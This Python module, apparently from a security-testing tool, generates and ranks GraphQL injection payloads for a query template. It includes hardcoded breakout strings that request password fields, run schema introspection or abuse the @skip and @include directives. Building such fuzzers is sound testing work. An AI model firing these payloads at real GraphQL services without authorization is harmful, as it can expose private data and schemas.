"""GraphQL injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_graphql_context

_STRING_BODIES = [
    ('") { id } injected: __schema { types { name } } #', "close-and-introspect"),
    ('") { id password } #', "close-and-fields"),
    ('" @skip(if: true) "', "directive"),
]

_ARG_BODIES = [
    ("1) { id password } injected: __typename #", "fields-and-introspect"),
    ("$var) @include(if: true) { id }", "directive"),
    ("1) { __schema { types { name } } }", "introspection"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class GraphqlCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class GraphqlMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[GraphqlCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def mutate_graphql(template: str) -> GraphqlMutationResult:
    """Generate and rank GraphQL injection payloads for ``template``."""
    from .analyzer import analyze_graphql

    context = analyze_graphql_context(template)
    generated = _STRING_BODIES if context == Context.GQL_STRING else _ARG_BODIES

    candidates: list[GraphqlCandidate] = []
    for payload, strategy in generated:
        result = analyze_graphql(template, payload)
        b = result.breakout
        if b.command_injected or "introspection" in b.separators:
            candidates.append(
                GraphqlCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=b.command_injected,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return GraphqlMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
